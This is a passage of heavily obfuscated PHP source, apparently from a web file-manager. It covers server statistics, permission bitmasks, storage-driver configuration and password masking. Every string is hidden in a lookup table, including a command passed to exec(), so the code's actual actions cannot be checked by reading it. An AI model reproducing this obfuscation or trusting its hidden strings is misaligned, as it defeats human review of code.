$ºÈ›„»ì[1862] => (int) $İÚÂÜæ); } private function optionAccess() { $¨Àøî•¬ =& $_SERVER[èùÙ¹Ïö]; return array($¨Àøî•¬[798] => $this->typeLogCnt(), $¨Àøî•¬[109] => $this->typeLogCnt($¨Àøî•¬[109]), $¨Àøî•¬[495] => $this->typeLogCnt($¨Àøî•¬[495]), $¨Àøî•¬[1863] => $this->typeLogCnt($¨Àøî•¬[1863]), $¨Àøî•¬[1864] => $this->typeLogCnt($¨Àøî•¬[1864]), $¨Àøî•¬[633] => $this->typeLogCnt($¨Àøî•¬[12], $¨Àøî•¬[1839])); } private function typeLogCnt($Ì¼Æ¤ëÌ = '', $†ìœ§¸ = "\151\x64") { $Í¹¶»ê =& $_SERVER[èùÙ¹Ïö]; $À¸†·í¢ = array($Í¹¶»ê[109] => array($Í¹¶»ê[1865], $Í¹¶»ê[1866]), $Í¹¶»ê[495] => array($Í¹¶»ê[1867], $Í¹¶»ê[1868]), $Í¹¶»ê[1863] => array($Í¹¶»ê[1869], $Í¹¶»ê[1870], $Í¹¶»ê[1871]), $Í¹¶»ê[1864] => array($Í¹¶»ê[1872], $Í¹¶»ê[1873]), $Í¹¶»ê[1874] => array($Í¹¶»ê[1875], $Í¹¶»ê[1876], $Í¹¶»ê[1877])); $“ö„²ùÌ = strtotime(date($Í¹¶»ê[1835])); $¨óƒÉ¨Ñ = array($Í¹¶»ê[217] => array($Í¹¶»ê[1060], $“ö„²ùÌ)); if ($Ì¼Æ¤ëÌ) { $¨óƒÉ¨Ñ[$Í¹¶»ê[33]] = array($Í¹¶»ê[7], $À¸†·í¢[$Ì¼Æ¤ëÌ]); } $Š¤İç³Á = Model($Í¹¶»ê[1838])->where($¨óƒÉ¨Ñ)->count($†ìœ§¸); return (int) $Š¤İç³Á; } private function optionServer() { $»¿–¯øî =& $_SERVER[èùÙ¹Ïö]; $ÜŠŞØ³‡ = $this->diskDriver(); $È¦¡ö±™ = KodIO::defaultDriver(); $Ìİêşà = array($»¿–¯øî[857] => $È¦¡ö±™[$»¿–¯øî[445]]); $¨ÎúÖİ± = Model($»¿–¯øî[514])->where($Ìİêşà)->sum($»¿–¯øî[78]); $ÌÍ‡¶Ù = explode($»¿–¯øî[53], $_SERVER[$»¿–¯øî[146]]); $æ»‚×”ş = $ÌÍ‡¶Ù[0]; $‹¦°İÈ = $GLOBALS[$»¿–¯øî[6]][$»¿–¯øî[21]]; $¥Ò¾â’æ = $‹¦°İÈ[$»¿–¯øî[1022]]; if ($¥Ò¾â’æ == $»¿–¯øî[1010]) { $ÍÊÇå¤Ò = explode($»¿–¯øî[1330], $‹¦°İÈ[$»¿–¯øî[1021]]); $¥Ò¾â’æ = $ÍÊÇå¤Ò[0]; } if ($¥Ò¾â’æ == $»¿–¯øî[958] || $¥Ò¾â’æ == $»¿–¯øî[844]) { $Å ¥œı = Model()->db()->query($»¿–¯øî[1878]); $Æ‘ì›Ò = $Å ¥œı[0] && isset($Å ¥œı[0][$»¿–¯øî[1591]]) ? $Å ¥œı[0][$»¿–¯øî[1591]] : 0; $¥Ò¾â’æ = $»¿–¯øî[1879] . ($Æ‘ì›Ò ? $»¿–¯øî[8] . $Æ‘ì›Ò : $»¿–¯øî[12]); } $ÑˆÚŞƒƒ = $GLOBALS[$»¿–¯øî[6]][$»¿–¯øî[395]][$»¿–¯øî[867]]; return array($»¿–¯øî[1880] => $ÜŠŞØ³‡ ? $ÜŠŞØ³‡[$»¿–¯øî[1881]] : 0, $»¿–¯øî[1882] => $ÜŠŞØ³‡ ? $ÜŠŞØ³‡[$»¿–¯øî[1883]] : 0, $»¿–¯øî[1884] => (int) $È¦¡ö±™[$»¿–¯øî[1881]] * 1024 * 1024 * 1024, $»¿–¯øî[1885] => (int) $¨ÎúÖİ±, $»¿–¯øî[1886] => ucfirst($æ»‚×”ş), $»¿–¯øî[1887] => $»¿–¯øî[1888] . PHP_VERSION, $»¿–¯øî[1889] => phpBuild64() ? 64 : 32, $»¿–¯øî[797] => str_replace($»¿–¯øî[1176], $»¿–¯øî[1038], $¥Ò¾â’æ), $»¿–¯øî[395] => ucfirst($ÑˆÚŞƒƒ), $»¿–¯øî[32] => $_SERVER[$»¿–¯øî[1890]]); } private function diskDriver() { $±àÏŒ¤ˆ =& $_SERVER[èùÙ¹Ïö]; $ñ°»æœ = $±àÏŒ¤ˆ[8]; $á¶¶µ™¢ = $GLOBALS[$±àÏŒ¤ˆ[6]][$±àÏŒ¤ˆ[1347]] == $±àÏŒ¤ˆ[1348]; if ($á¶¶µ™¢) { $ñ°»æœ = $±àÏŒ¤ˆ[1891]; if (function_exists($±àÏŒ¤ˆ[1892])) { exec($±àÏŒ¤ˆ[1893], $½é·÷†Ó); $ñ°»æœ = $½é·÷†Ó[1] . $±àÏŒ¤ˆ[8]; } } if (!file_exists($ñ°»æœ)) { return; } $¾üŠãóø = @disk_total_space($ñ°»æœ); $ìëéëŒø = $¾üŠãóø - @disk_free_space($ñ°»æœ); return array($±àÏŒ¤ˆ[1881] => $¾üŠãóø, $±àÏŒ¤ˆ[1883] => $ìëéëŒø); } public function fileChart($¨â¸È´) { $ò÷‘ãş‘ =& $_SERVER[èùÙ¹Ïö]; if (isset($¨â¸È´[$ò÷‘ãş‘[1696]])) { return Model($ò÷‘ãş‘[865])->userFileTypeProfile($¨â¸È´[$ò÷‘ãş‘[1696]]); } if (isset($¨â¸È´[$ò÷‘ãş‘[1894]])) { return Model($ò÷‘ãş‘[865])->groupFileTypeProfile($¨â¸È´[$ò÷‘ãş‘[1894]]); } $¢Üğ¡—¢ = $this->sourceSize(); $Œş¹Œé = array($ò÷‘ãş‘[182] => 0, $ò÷‘ãş‘[180] => 1); $âÈ™¦³Î = Model($ò÷‘ãş‘[865])->where($Œş¹Œé)->sum($ò÷‘ãş‘[78]); $Œş¹Œé[$ò÷‘ãş‘[180]] = 2; $ËÊæà’– = Model($ò÷‘ãş‘[865])->where($Œş¹Œé)->sum($ò÷‘ãş‘[78]); return array($ò÷‘ãş‘[803] => $¢Üğ¡—¢[$ò÷‘ãş‘[78]], $ò÷‘ãş‘[1828] => $¢Üğ¡—¢[$ò÷‘ãş‘[1828]], $ò÷‘ãş‘[1829] => (int) $âÈ™¦³Î, $ò÷‘ãş‘[1830] => (int) $ËÊæà’–); } private function sourceSize() { $¸¿Í¬øá =& $_SERVER[èùÙ¹Ïö]; $Åè”—‹§ = Model($¸¿Í¬øá[865])->where(array($¸¿Í¬øá[455] => 0))->sum($¸¿Í¬øá[78]); $÷¦¡Ìó = Model($¸¿Í¬øá[514])->sum($¸¿Í¬øá[78]); if ($÷¦¡Ìó > $Åè”—‹§) { $÷¦¡Ìó = $Åè”—‹§; } return array($¸¿Í¬øá[78] => (int) $Åè”—‹§, $¸¿Í¬øá[1828] => (int) $÷¦¡Ìó); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $˜³à­Àş =& $_SERVER[èùÙ¹Ïö]; $±óÒ‘Ò» = array(array($˜³à­Àş[464] => LNG($˜³à­Àş[1895]), $˜³à­Àş[1896] => $˜³à­Àş[1897], $˜³à­Àş[1898] => 1, $˜³à­Àş[1899] => 1, $˜³à­Àş[1900] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜³à­Àş[464] => LNG($˜³à­Àş[1901]), $˜³à­Àş[1896] => $˜³à­Àş[1902], $˜³à­Àş[1898] => 2, $˜³à­Àş[1899] => 1, $˜³à­Àş[1900] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜³à­Àş[464] => LNG($˜³à­Àş[1903]), $˜³à­Àş[1896] => $˜³à­Àş[1904], $˜³à­Àş[1898] => 3, $˜³à­Àş[1899] => 1, $˜³à­Àş[1900] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜³à­Àş[464] => LNG($˜³à­Àş[1905]), $˜³à­Àş[1896] => $˜³à­Àş[1906], $˜³à­Àş[1898] => 4, $˜³à­Àş[1899] => 1, $˜³à­Àş[1900] => self::AUTH_SHOW | self::AUTH_VIEW), array($˜³à­Àş[464] => LNG($˜³à­Àş[1907]), $˜³à­Àş[1896] => $˜³à­Àş[1908], $˜³à­Àş[1898] => 5, $˜³à­Àş[1899] => 1, $˜³à­Àş[1900] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($˜³à­Àş[464] => LNG($˜³à­Àş[1909]), $˜³à­Àş[1896] => $˜³à­Àş[1910], $˜³à­Àş[1898] => 6, $˜³à­Àş[1899] => 1, $˜³à­Àş[1900] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($˜³à­Àş[464] => LNG($˜³à­Àş[1911]), $˜³à­Àş[1896] => $˜³à­Àş[1912], $˜³à­Àş[1898] => 7, $˜³à­Àş[1899] => 1, $˜³à­Àş[1900] => 0)); return $±óÒ‘Ò»; } public static function authCheck($Œ­ñÙ«Ğ, $ÀÚà„¾Š) { $æùÃˆ˜œ =& $_SERVER[èùÙ¹Ïö]; $Œ­ñÙ«Ğ = intval($Œ­ñÙ«Ğ); if ($GLOBALS[$æùÃˆ˜œ[539]] && $GLOBALS[$æùÃˆ˜œ[6]][$æùÃˆ˜œ[1913]]) { return !0; } if ($Œ­ñÙ«Ğ <= 0) { return !1; } if (($Œ­ñÙ«Ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Œ­ñÙ«Ğ & $ÀÚà„¾Š); } public static function authCheckShow($•ÍÆ«÷°) { return self::authCheck($•ÍÆ«÷°, self::AUTH_SHOW); } public static function authCheckView($‘ÓÈ˜˜¡) { return self::authCheck($‘ÓÈ˜˜¡, self::AUTH_VIEW); } public static function authCheckDownload($¢åîá¯) { return self::authCheck($¢åîá¯, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÇñöÔõ•) { return self::authCheck($ÇñöÔõ•, self::AUTH_UPLOAD); } public static function authCheckEdit($®ü²İÉû) { return self::authCheck($®ü²İÉû, self::AUTH_EDIT); } public static function authCheckRemove($„ë¥Ñä) { return self::authCheck($„ë¥Ñä, self::AUTH_REMOVE); } public static function authCheckShare($à±Â½ÙÅ) { return self::authCheck($à±Â½ÙÅ, self::AUTH_SHARE); } public static function authCheckComment($·Òİ¨ÉÒ) { return self::authCheck($·Òİ¨ÉÒ, self::AUTH_COMMENT); } public static function authCheckEvent($—Ğõ¿ó) { return self::authCheck($—Ğõ¿ó, self::AUTH_EVENT); } public static function authCheckRoot($¾ò¯ô¨) { return self::authCheck($¾ò¯ô¨, self::AUTH_ROOT); } public static function authCheckAction($’ªÆõØ, $¦ª‚µ®ğ) { $¾ªòÆ³ =& $_SERVER[èùÙ¹Ïö]; $ÜâêÁÖ = array($¾ªòÆ³[1914] => self::AUTH_VIEW, $¾ªòÆ³[1242] => self::AUTH_DOWNLOAD, $¾ªòÆ³[109] => self::AUTH_UPLOAD, $¾ªòÆ³[1864] => self::AUTH_EDIT, $¾ªòÆ³[1863] => self::AUTH_REMOVE, $¾ªòÆ³[1874] => self::AUTH_SHARE, $¾ªòÆ³[400] => self::AUTH_COMMENT, $¾ªòÆ³[1684] => self::AUTH_EVENT, $¾ªòÆ³[1915] => self::AUTH_ROOT); if (!isset($ÜâêÁÖ[$¦ª‚µ®ğ])) { return; } $õ·˜ú¾ı = $ÜâêÁÖ[$¦ª‚µ®ğ]; $’ªÆõØ = intval($’ªÆõØ); if ($’ªÆõØ <= 0) { return !1; } if (($’ªÆõØ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($’ªÆõØ & $õ·˜ú¾ı); } public static function authDisable($àÏºøè, $Ş˜æ‹³Ñ) { if (intval($àÏºøè) <= 0) { return 0; } return intval($àÏºøè) & ~$Ş˜æ‹³Ñ; } public $optionType = "\x53\x79\163\x74\145\155\x2e\163\x6f\x75\162\143\145\101\165\164\150\114\151\163\x74"; public $field = array("\156\x61\x6d\145", "\x61\165\164\150", "\154\x61\142\x65\154", "\x64\x69\163\160\154\x61\x79", "\163\171\x73\x74\145\x6d", "\163\157\x72\x74"); public function initData() { $æÏ¨ùî– = $this->authDefault(); foreach ($æÏ¨ùî– as $É¤¦¼ß¸) { $this->add($É¤¦¼ß¸); } } public function findAuth($Ó«È³ã“, $‚ÄƒŞ¶) { $‚›ÙÏÂ‚ =& $_SERVER[èùÙ¹Ïö]; $‰ª»ú†³ = parent::listData(); foreach ($‰ª»ú†³ as $øÌ×ÄÆÇ) { $è›Âí±¡ = intval($øÌ×ÄÆÇ[$‚›ÙÏÂ‚[457]]); if ($è›Âí±¡ <= 0 || $øÌ×ÄÆÇ[$‚›ÙÏÂ‚[1916]] == 0) { continue; } if (($è›Âí±¡ & $Ó«È³ã“) != $Ó«È³ã“) { continue; } if (($è›Âí±¡ & $‚ÄƒŞ¶) != 0) { continue; } return $øÌ×ÄÆÇ[$‚›ÙÏÂ‚[445]]; } return !1; } public function findAuthReadOnly() { $Û¢Ë ñê = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $£âóµ• = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Û¢Ë ñê, $£âóµ•); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $’Ãßå¡ =& $_SERVER[èùÙ¹Ïö]; $šµ±ûÜ = parent::listData(); $à•òù÷‘ = !1; foreach ($šµ±ûÜ as $í´İÙ«) { if ($í´İÙ«[$’Ãßå¡[457]] <= 0 || $í´İÙ«[$’Ãßå¡[1916]] == $’Ãßå¡[214]) { continue; } if (!$à•òù÷‘) { $à•òù÷‘ = $í´İÙ«; continue; } if ($à•òù÷‘[$’Ãßå¡[457]] > $í´İÙ«[$’Ãßå¡[457]]) { $à•òù÷‘ = $í´İÙ«; } } return $à•òù÷‘ ? $à•òù÷‘[$’Ãßå¡[445]] : $’Ãßå¡[12]; } public function listData($ƒ¨½ıÖ³ = false, $óæ§‹ = "\x73\x6f\162\x74", $ê§Ø÷£Ş = false) { return parent::listData($ƒ¨½ıÖ³, $óæ§‹, $ê§Ø÷£Ş); } public function update($Èìº—Ü¾, $¥ú¬±ú³) { $¦æ¾Ø¯ =& $_SERVER[èùÙ¹Ïö]; $èïóæ¼² = parent::listData($Èìº—Ü¾); $Ø”—”³ = $this->findByName($¥ú¬±ú³[$¦æ¾Ø¯[32]]); if (!$èïóæ¼² || $Ø”—”³ && $Ø”—”³[$¦æ¾Ø¯[445]] != $èïóæ¼²[$¦æ¾Ø¯[445]]) { return !1; } $this->filterAuth($¥ú¬±ú³[$¦æ¾Ø¯[457]]); return parent::update($Èìº—Ü¾, $¥ú¬±ú³); } public function remove($Ç‘¢¢œ­) { $Ë˜ˆ”ú = parent::listData($Ç‘¢¢œ­); if (!$Ë˜ˆ”ú || $Ë˜ˆ”ú[$_SERVER[èùÙ¹Ïö][181]]) { return !1; } return parent::remove($Ç‘¢¢œ­); } public function add($‡Õù­¼Ô = array()) { $‘’¿ğÒ =& $_SERVER[èùÙ¹Ïö]; if ($this->findByName($‡Õù­¼Ô[$‘’¿ğÒ[32]])) { return !1; } $ç®°¼À• = array($‘’¿ğÒ[32] => $‘’¿ğÒ[12], $‘’¿ğÒ[457] => 1, $‘’¿ğÒ[1917] => $‘’¿ğÒ[1904], $‘’¿ğÒ[1916] => 1, $‘’¿ğÒ[181] => 0, $‘’¿ğÒ[1918] => 0); $‡Õù­¼Ô = array_merge($ç®°¼À•, $‡Õù­¼Ô); $‡Õù­¼Ô[$‘’¿ğÒ[1918]] = $this->getSort(); $this->filterAuth($‡Õù­¼Ô[$‘’¿ğÒ[457]]); return parent::insert($‡Õù­¼Ô); } private function getSort() { $©áæî€Ñ =& $_SERVER[èùÙ¹Ïö]; $ïµÈ„–ƒ = parent::listData(); $®æüæÂÛ = array_to_keyvalue($ïµÈ„–ƒ, $©áæî€Ñ[12], $©áæî€Ñ[1918]); return empty($®æüæÂÛ) ? 0 : max($®æüæÂÛ) + 1; } private function filterAuth(&$º©ƒ·¸•) { if (!$º©ƒ·¸•) { return; } $Áğ£Â‡¦ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $°øš¶àá = array(); foreach ($Áğ£Â‡¦ as $§¯ªÓ£ó) { if ($º©ƒ·¸• & $§¯ªÓ£ó) { $°øš¶àá[] = $§¯ªÓ£ó; } } if (in_array(self::AUTH_ROOT, $°øš¶àá)) { $º©ƒ·¸• = array_sum($Áğ£Â‡¦); return; } $Óî¥Åë = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($°øš¶àá as $§¯ªÓ£ó) { if (isset($Óî¥Åë[$§¯ªÓ£ó])) { $°øš¶àá = array_merge($°øš¶àá, $Óî¥Åë[$§¯ªÓ£ó]); } } $°øš¶àá[] = self::AUTH_SHOW; $º©ƒ·¸• = array_sum(array_unique($°øš¶àá)); } public function sort($Ú¹œ£ÈÖ, $· Ë…¼©) { return parent::update($Ú¹œ£ÈÖ, $· Ë…¼©); } } goto EÎå¢¹Àö­; aù†ç‹åš: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\x73\157\x75\162\143\x65\123\145\143\x72\145\x74\114\x69\x73\164"; public $field = array("\x73\x6f\x75\x72\143\x65\x49\104", "\164\x79\x70\145\111\104", "\x63\x72\x65\141\164\x65\x55\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\x73\x74\x6f\x72\x61\x67\x65\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x73\151\172\x65\115\x61\170", "\x73\171\x73\164\145\155", "\x64\x65\146\x61\165\154\164", "\144\x72\151\166\x65\x72", "\x63\157\156\x66\151\147"); public function listData($£·êÑùë = false, $¬«ŒÈ¸ = "\x6d\157\144\151\146\x79\x54\151\155\145", $ìíÉ­ñÓ = false) { $…¶šõƒ¹ =& $_SERVER[èùÙ¹Ïö]; $øÎµ©ŒÊ = parent::listData($£·êÑùë, $¬«ŒÈ¸, $ìíÉ­ñÓ); if ($£·êÑùë) { return $øÎµ©ŒÊ; } $ÀÂÎûş = $this->ioSizeUseGet(array_to_keyvalue($øÎµ©ŒÊ, $…¶šõƒ¹[12], $…¶šõƒ¹[445])); foreach ($øÎµ©ŒÊ as $çÕ‰ÈÛ„ => $Í´‹Î£·) { unset($øÎµ©ŒÊ[$çÕ‰ÈÛ„][$…¶šõƒ¹[6]]); $øÎµ©ŒÊ[$çÕ‰ÈÛ„][$…¶šõƒ¹[1883]] = isset($ÀÂÎûş[$Í´‹Î£·[$…¶šõƒ¹[445]]]) ? $ÀÂÎûş[$Í´‹Î£·[$…¶šõƒ¹[445]]] : 0; } return $øÎµ©ŒÊ; } public function ioSizeUseGet($÷ë³¿²) { $ıû¾“ø =& $_SERVER[èùÙ¹Ïö]; if (!$÷ë³¿²) { return array(); } $È­ï¸â = $ıû¾“ø[2215] . implode($ıû¾“ø[50], $÷ë³¿²); $º™¶ßøÏ = Cache::get($È­ï¸â); if ($º™¶ßøÏ) { return $º™¶ßøÏ; } $¦ßïŞ¨¬ = array($ıû¾“ø[857] => $ıû¾“ø[445], $ıû¾“ø[2216] => $ıû¾“ø[78]); $§€Ñµó° = array($ıû¾“ø[857] => array($ıû¾“ø[7], $÷ë³¿²)); $º™¶ßøÏ = Model($ıû¾“ø[829])->field($¦ßïŞ¨¬)->where($§€Ñµó°)->group($ıû¾“ø[857])->select(); $º™¶ßøÏ = array_to_keyvalue($º™¶ßøÏ, $ıû¾“ø[445], $ıû¾“ø[78]); Cache::set($È­ï¸â, $º™¶ßøÏ, 600); return $º™¶ßøÏ; } public function getConfig($¿“Ôö¼³) { $®¾„ŞÜ = parent::listData($¿“Ôö¼³); return json_decode($®¾„ŞÜ[$_SERVER[èùÙ¹Ïö][6]], !0); } public function update($—âìŸ°ï, $›Ú›şêù) { $¦ËıŒ =& $_SERVER[èùÙ¹Ïö]; $ôåÖ±ˆ» = $›Ú›şêù[$¦ËıŒ[32]]; $Ú¥¨†‹ = array_to_keyvalue(parent::listData(), $¦ËıŒ[32]); if (isset($Ú¥¨†‹[$ôåÖ±ˆ»]) && $Ú¥¨†‹[$ôåÖ±ˆ»][$¦ËıŒ[445]] != $—âìŸ°ï) { return !1; } $this->checkPwd($—âìŸ°ï, $›Ú›şêù); if (isset($›Ú›şêù[$¦ËıŒ[2217]]) && $›Ú›şêù[$¦ËıŒ[2217]] == $¦ËıŒ[90]) { $this->checkConfig($›Ú›şêù); } unset($›Ú›şêù[$¦ËıŒ[2217]]); $Ğ¦»³Ë = parent::update($—âìŸ°ï, $›Ú›şêù); if ($Ğ¦»³Ë && $›Ú›şêù[$¦ËıŒ[37]]) { $–Èğ‹¡ = 0; foreach ($Ú¥¨†‹ as $Õ­¶“éé) { if ($Õ­¶“éé[$¦ËıŒ[37]] && $Õ­¶“éé[$¦ËıŒ[445]] != $—âìŸ°ï) { $–Èğ‹¡ = $Õ­¶“éé[$¦ËıŒ[445]]; parent::update($Õ­¶“éé[$¦ËıŒ[445]], array($¦ËıŒ[37] => 0)); } } $this->updateBackup($—âìŸ°ï, $–Èğ‹¡); } return $Ğ¦»³Ë; } public function add($¢–²®¶ß) { $Ç“Â¶ƒ =& $_SERVER[èùÙ¹Ïö]; $ÔÎ—ú´ø = array_to_keyvalue(parent::listData(), $Ç“Â¶ƒ[32]); if (isset($ÔÎ—ú´ø[$¢–²®¶ß[$Ç“Â¶ƒ[32]]])) { return !1; } $this->checkConfig($¢–²®¶ß); $¨èÊ¢¡Ô = parent::insert($¢–²®¶ß); if ($¨èÊ¢¡Ô && $¢–²®¶ß[$Ç“Â¶ƒ[37]]) { foreach ($ÔÎ—ú´ø as $îÜ•÷šç) { if ($îÜ•÷šç[$Ç“Â¶ƒ[37]]) { parent::update($îÜ•÷šç[$Ç“Â¶ƒ[445]], array($Ç“Â¶ƒ[37] => 0)); } } } return $¨èÊ¢¡Ô; } public function updateBackup($°ó´Ÿû³, $Æï©š†») { $øôÊ¤åü =& $_SERVER[èùÙ¹Ïö]; if (!$Æï©š†») { return; } $œúº¥ÏÅ = Model($øôÊ¤åü[789])->config(); if ($œúº¥ÏÅ[$øôÊ¤åü[1666]] != $øôÊ¤åü[90] || $œúº¥ÏÅ[$øôÊ¤åü[791]] != $Æï©š†») { return; } $È„€ÙÍç = Model($øôÊ¤åü[810])->get($øôÊ¤åü[820]); $È„€ÙÍç = json_decode($È„€ÙÍç, !0); if (!$È„€ÙÍç) { return; } $È„€ÙÍç[$øôÊ¤åü[791]] = $°ó´Ÿû³; Model($øôÊ¤åü[810])->set(array($øôÊ¤åü[820] => $È„€ÙÍç)); } public function checkPwd($×¦¨Ï¸¼, &$»Ü§å–Ú) { $šÍçå¦ï =& $_SERVER[èùÙ¹Ïö]; if (empty($»Ü§å–Ú[$šÍçå¦ï[6]])) { return; } $ï¥ªàÕú = json_decode($»Ü§å–Ú[$šÍçå¦ï[6]], !0); $ë¿›«Í® = $šÍçå¦ï[12]; $ïşÂĞ¤á = array($šÍçå¦ï[2218], $šÍçå¦ï[2219], $šÍçå¦ï[935]); foreach ($ïşÂĞ¤á as $’ï±ïÂƒ) { if (isset($ï¥ªàÕú[$’ï±ïÂƒ])) { $ë¿›«Í® = $’ï±ïÂƒ; break; } } if (!$ë¿›«Í®) { return; } $½Â·©à‰ = $this->getConfig($×¦¨Ï¸¼); $·Øñ÷œá = $½Â·©à‰[$ë¿›«Í®]; $¯èöœÄ  = $ï¥ªàÕú[$ë¿›«Í®]; if ($¯èöœÄ  == str_repeat($šÍçå¦ï[205], strlen($·Øñ÷œá))) { $ï¥ªàÕú[$ë¿›«Í®] = $·Øñ÷œá; $»Ü§å–Ú[$šÍçå¦ï[6]] = json_encode($ï¥ªàÕú); } else { if ($¯èöœÄ  != $·Øñ÷œá) { $»Ü§å–Ú[$šÍçå¦ï[2217]] = $šÍçå¦ï[90]; } } } public function checkConfig(&$Î‹„§ƒ, $£âÃËÜ = false) { $áÄÜ‹ç¾ =& $_SERVER[èùÙ¹Ïö]; $‚¨‰Š¤“ = strtolower($Î‹„§ƒ[$áÄÜ‹ç¾[97]]); $·‚°ê„ = json_decode($Î‹„§ƒ[$áÄÜ‹ç¾[6]], !0); foreach ($·‚°ê„ as $”¿ÆÄ¿ => $ÃÀ…ğ…) { if (is_string($ÃÀ…ğ…)) { $·‚°ê„[$”¿ÆÄ¿] = trim($ÃÀ…ğ…); } } $·‚°ê„[$áÄÜ‹ç¾[2220]] = rand_string(6); $€ƒµİ”Û = $GLOBALS[$áÄÜ‹ç¾[6]][$áÄÜ‹ç¾[91]][$áÄÜ‹ç¾[866]]; $§Îı÷® = isset($€ƒµİ”Û[$‚¨‰Š¤“]) ? $€ƒµİ”Û[$‚¨‰Š¤“] : ucfirst($‚¨‰Š¤“); $ı¥ú¦Á† = $áÄÜ‹ç¾[76] . $§Îı÷®; if (!$§Îı÷® || !class_exists($ı¥ú¦Á†)) { if ($£âÃËÜ) { return LNG($áÄÜ‹ç¾[2221]); } write_log(array($áÄÜ‹ç¾[2222], $Î‹„§ƒ, get_caller_info()), $áÄÜ‹ç¾[2223]); show_json(LNG($áÄÜ‹ç¾[2221]), !1, $Î‹„§ƒ); } $ÙËú²× = new $ı¥ú¦Á†($·‚°ê„); if (in_array($‚¨‰Š¤“, $ÙËú²×->objectDriver)) { if (!$ÙËú²×->isBucketCors() && !$ÙËú²×->setBucketCors()) { $º¢ãÅñ = LNG($áÄÜ‹ç¾[2224]); $º¢ãÅñ .= $áÄÜ‹ç¾[2225] . LNG($áÄÜ‹ç¾[2226]); if ($£âÃËÜ) { return $º¢ãÅñ; } show_json($º¢ãÅñ, !1); } } $ÆÌ™¼ü = rtrim($·‚°ê„[$áÄÜ‹ç¾[1228]], $áÄÜ‹ç¾[8]) . $áÄÜ‹ç¾[8]; $˜‘˜÷—’ = $ÙËú²×->getPath($ÆÌ™¼ü . $áÄÜ‹ç¾[1232]); if (!$ÙËú²×->mkfile($˜‘˜÷—’)) { if ($£âÃËÜ) { return LNG($áÄÜ‹ç¾[2224]); } show_json(LNG($áÄÜ‹ç¾[2224]), !1); } $·‚°ê„[$áÄÜ‹ç¾[1228]] = $ÆÌ™¼ü; $Î‹„§ƒ[$áÄÜ‹ç¾[6]] = json_encode($·‚°ê„); $Î‹„§ƒ[$áÄÜ‹ç¾[97]] = $§Îı÷®; return !0; } public function driverListSystem() { $²ÁéàÈœ =& $_SERVER[èùÙ¹Ïö]; $àÆÚ£µá = parent::listData(); $°õÜáø² = array(); foreach ($àÆÚ£µá as $Ã”ƒ¯—Ğ) { unset($Ã”ƒ¯—Ğ[$²ÁéàÈœ[217]], $Ã”ƒ¯—Ğ[$²ÁéàÈœ[87]]); $Ã”ƒ¯—Ğ[$²ÁéàÈœ[6]] = json_decode($Ã”ƒ¯—Ğ[$²ÁéàÈœ[6]], !0); $°õÜáø²[] = $Ã”ƒ¯—Ğ; } return $°õÜáø²; } public function defaultDriver() { $²Ï³¹Éğ =& $_SERVER[èùÙ¹Ïö]; $ €±ƒÏ = parent::listData(); $™á´¨±“ = array_filter_by_field($ €±ƒÏ, $²Ï³¹Éğ[37], 1); $™á´¨±“ = $™á´¨±“[0]; if ($™á´¨±“) { $™á´¨±“[$²Ï³¹Éğ[6]] = json_decode($™á´¨±“[$²Ï³¹Éğ[6]], !0); } return $™á´¨±“; } public function driverInfo($—ıÕ¥º¾) { $Ì«…ç¨Ú =& $_SERVER[èùÙ¹Ïö]; $Ñï§‹Â± = array_to_keyvalue(parent::listData(), $Ì«…ç¨Ú[445]); if (!isset($Ñï§‹Â±[$—ıÕ¥º¾])) { return !1; } $Æµ§¢óç = $Ñï§‹Â±[$—ıÕ¥º¾]; $Æµ§¢óç[$Ì«…ç¨Ú[6]] = json_decode($Æµ§¢óç[$Ì«…ç¨Ú[6]], !0); return $Æµ§¢óç; } public function remove($®™½ÇÇò) { $this->removeShareItems($®™½ÇÇò); return parent::remove($®™½ÇÇò); } public function removeWithFile($‡¶˜æ®„, $µ•…ŸØ•) { $òŞ¡ÇòŞ =& $_SERVER[èùÙ¹Ïö]; $æÙ»ëö— = 